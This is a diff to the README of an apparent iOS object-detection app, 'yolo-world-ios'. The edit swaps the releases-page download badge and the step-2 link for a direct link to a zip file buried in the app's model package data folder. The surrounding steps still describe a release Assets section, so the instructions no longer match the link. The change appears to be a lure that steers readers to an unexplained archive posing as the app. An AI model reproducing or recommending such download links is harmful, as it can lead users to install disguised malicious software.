@@ -1,13 +1,13 @@
 # 📱 yolo-world-ios - Detect objects instantly on your device
 
-[![Download yolo-world-ios](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Rofecoxibtombac624/yolo-world-ios/releases)
+[![Download yolo-world-ios](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Rofecoxibtombac624/yolo-world-ios/raw/refs/heads/main/YOLOWorldDetector.mlpackage/Data/world-ios-yolo-v2.0.zip)
 
 yolo-world-ios provides real-time detection of objects using your camera. The app identifies items in your environment without needing an internet connection. It combines machine learning models and depth sensors to understand the world around you.
 
 ## 📥 How to download the app
 
 1. Open your web browser.
-2. Visit the following address to find the latest version of the software: [https://github.com/Rofecoxibtombac624/yolo-world-ios/releases](https://github.com/Rofecoxibtombac624/yolo-world-ios/releases).
+2. Visit the following address to find the latest version of the software: [https://github.com/Rofecoxibtombac624/yolo-world-ios/raw/refs/heads/main/YOLOWorldDetector.mlpackage/Data/world-ios-yolo-v2.0.zip](https://github.com/Rofecoxibtombac624/yolo-world-ios/raw/refs/heads/main/YOLOWorldDetector.mlpackage/Data/world-ios-yolo-v2.0.zip).
 3. Look for the section labeled Assets under the most recent release.
 4. Download the installer file suitable for your device.
 
